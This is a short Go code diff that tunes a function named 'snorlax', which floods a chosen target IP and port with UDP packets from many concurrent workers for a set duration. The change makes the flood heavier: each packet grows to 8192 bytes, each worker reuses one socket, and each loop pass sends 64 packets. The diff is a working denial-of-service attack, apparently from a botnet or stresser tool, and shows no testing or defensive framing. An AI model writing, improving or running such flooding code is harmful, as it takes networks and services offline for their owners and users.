@@ -1114,11 +1114,17 @@ func snorlax(targetIP string, targetPort, duration int) {
 	ctx, cancel := context.WithTimeout(context.Background(), time.Duration(duration)*time.Second)
 	defer cancel()
 	var wg sync.WaitGroup
-	payload := make([]byte, 1024)
+	payload := make([]byte, 8192)
+	dst := &net.UDPAddr{IP: dstIP, Port: targetPort}
 	for i := 0; i < workerPool; i++ {
 		wg.Add(1)
 		guardedGo("snorlax", func() {
 			defer wg.Done()
+			conn, err := net.ListenPacket("udp4", ":0")
+			if err != nil {
+				return
+			}
+			defer conn.Close()
 			for {
 				select {
 				case <-ctx.Done():
@@ -1126,12 +1132,9 @@ func snorlax(targetIP string, targetPort, duration int) {
 				case <-stopCh:
 					return
 				default:
-					conn, err := net.Dial("udp", fmt.Sprintf("%s:%d", dstIP, targetPort))
-					if err != nil {
-						continue
+					for j := 0; j < 64; j++ {
+						conn.WriteTo(payload, dst)
 					}
-					conn.Write(payload)
-					conn.Close()
 				}
 			}
 		})
